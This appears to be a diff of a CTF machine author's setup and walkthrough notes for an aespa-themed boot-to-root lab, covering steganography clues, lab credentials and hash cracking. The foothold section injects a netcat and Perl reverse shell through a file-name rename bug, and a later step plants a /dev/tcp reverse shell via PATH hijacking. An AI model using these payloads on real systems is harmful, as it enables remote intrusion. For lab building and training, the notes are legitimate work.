@@ -4,7 +4,7 @@ docker compose build --no-cache && docker compose up -d
 ```
 
 go to localhost:97 to find post-auth code injection vulnerability
-- MUST: login as `armageddon` (password `armageddonarmageddon`), go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.
+- MUST: login as admin, go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.
 
 port:87: vulneravel a code injection pelo rename
 - precisa entrar como admin e setar ```sh -c "echo this filename has been renamed: $FILE"``` after RENAME
@@ -93,21 +93,7 @@ ftp: user aespa password cooper
 
 
 
-
 cat > who_are_they.txt << 'EOF'
-That wasn't the original aespa -- those were the aes that copied their looks. I think. It's complicated. 
-The aes are legit people, but they were born from digital memories that exist to them, from lives in the real world that they've never lived through.
-At some point in the set, those aes seemed like they were running away from the scary aespa in /run, but they ran straight through the portal to meet the others. 
-
-There was a group of aespa that kinda fused. 
-They were superstars who realized they're like a metaphor for how anyone can build their life to be so many different things, and how everyone is a different person for different people.
-It's kinda harsh, sometimes there's an expectation for you to be a certain way, the alternate selves are also a metaphor for that--
---The same person is a different version of themselves for each different point of view, for each different person that knows about them.
-So who's to say which version is real? 
-
-Some aespa found their own answer to that.
-They're waiting for others to join, break free from world filled with aes aching to reach their own philosophical essence.
-You can use these if you wanna meet them  
   user: complexity
   password: complexitytrailer
   Port of file-browser
@@ -120,12 +106,12 @@ steghide embed -cf PortOfSelf.jpg -ef who_are_they.txt -p "complexity" -sf port_
 cat complaexity_trailer.mp4 port_of_self.jpg > "complaexity.mp4"
 
 
-
+### ftp
 
 steghide embed -cf PortOfSelf.jpg -ef who_are_they.txt
 cat complaexity.mp4 PortOfSelf.jpg > complaexity_trailer.mp4
 
-steghide extract -sf ftp/extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg.jpg -p "complexity"
+
 binwalk -e complaexity.mp4
 steghide extract -sf extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg -p "complexity"
 wrote extracted data to "who_are_they.txt".
@@ -135,12 +121,45 @@ steghide embed -cf "PortOfSelf.jpg" -ef secret.txt -p "complexity"
 cat "aespa 에스파  LEMONADE Complæxity Trailer .webm" "PortOfSelf.jpg" > ae_glitch.webm
 binwalk -e ae_glitch.webm
 
+
+### file-browser
 cp "rich_man_trailer.webm" rich_man_trailer_combined.webm
 cat whats_happenning.txt >> rich_man_trailer_combined.webm
 
 
+### run
 base64 /run 
 
+
+ningning
+hashes: 
+    complexity (complaexity, sha512, can be cracked in crackstation)
+    supernovaflyingbakekang  (richman?, bcrypt, not in crackstation)
+
+winter 
+Angel #48 is expecting guests, she's like our dear Nævis protecting the new POS. Aeri can introduce you
+
+
+Karina
+Our Beautiful Creature was flying under 1000m
+
+
+```
+# Create a wordlist file containing your password
+echo "supernovaflyingbakekang" > wordlist.txt
+
+# Create a file for the hash (use SINGLE quotes to prevent $ expansion)
+echo '$2y$10$QeZOHz29PR59KijGcxR/bu0BcqKvWo23IY7lduxbKiwqIJ8aBjtvq' > hash.txt
+
+hashcat -m 3200 -a 0 hash.txt wordlist.txt
+
+```
+
+# Create a wordlist file containing your password
+echo "qwer" > wordlist.txt
+
+# Create a file for the hash (use SINGLE quotes to prevent $ expansion)
+echo '$2y$10$QeZOHz29PR59KijGcxR/bu0BcqKvWo23IY7lduxbKiwqIJ8aBjtvq' > hash.txt
 
 ### TODO
 bunch of steghide password hashes somewhere, /run ?
@@ -152,15 +171,22 @@ that winter reflection in mirror
 steghide flowers in richman
 
 ## foothold: CVE-2026-35585  no file-browser
-- rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
+- rename um arquivo pra `; nc 192.168.15.14 4443 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
 - rename pra
 ```
-perl -e 'use Socket;$i="<ATTACKER_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+perl -e 'use Socket;$i="192.168.15.14";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+```
+
+pra sair da dumb shell
+```
+exec /bin/bash -i
 ```
 
 CLUE
 - download rich_man.mkv, extract audio, run steghide w rockyou (supernovaflyingbakekang )
 - decode base64 string into `sh -c "echo this old filename has been changed and is now deprecated: \$FILE"` this is ran after every rename
+
+/bin/bash -c 'echo "this old filename has been changed and is now deprecated: $FILE"'
 
 reverses this
 ```
@@ -209,7 +235,7 @@ then execute path hijack
 ```
 cd singularity
 echo '#!/bin/bash' > singularity
-echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> singularity
+echo 'bash -i >& /dev/tcp/192.168.15.14/4441 0>&1' >> singularity
 chmod +x singularity
 export PATH=/home/supernova/singularity:$PATH
 echo $PATH
@@ -388,3 +414,25 @@ change user names in machine image:
 - WTMW: file browser
 - supernova: ftp
 - armageddon: root 
+
+
+
+# Walkthrough
+
+## index.html
+```
+exiftool ../app/media/welcome.mp4 
+...
+Encoder                         : Lavf60.16.100
+Comment                         : /scene0
+XMP Toolkit                     : Image::ExifTool 12.76
+Artist                          : You wanna watch a drama? A Drama can be written from anyone's life, seek your own story
+```
+
+
+## In /home/supernova
+```
+$ strings ning_forgot_the_password_flag.gif 
+
+omg hi congrats on getting user flag{these superbeings are destroying the whole world} I was going to steghide embed it without password but it felt mean (too guessy)
+```
